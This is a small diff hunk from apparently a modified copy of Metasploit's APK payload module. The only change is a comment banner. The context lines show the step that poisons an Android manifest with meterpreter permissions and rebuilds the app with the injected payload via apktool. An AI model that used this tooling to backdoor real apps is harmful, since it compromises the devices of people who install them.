@@ -241,7 +241,7 @@ class Msf::Payload::Apk
     print_status "Poisoning the manifest with meterpreter permissions..\n"
     fix_manifest(tempdir, package, classes['MainService'], classes['MainBroadcastReceiver'])
 
-    ############################## Modified ##################################
+    ############################################################# ##################################
     
     print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}\n"
     run_cmd("apktool b --aapt $HOME/java/openjdk/bin/aapt -o #{injected_apk} #{tempdir}/original")
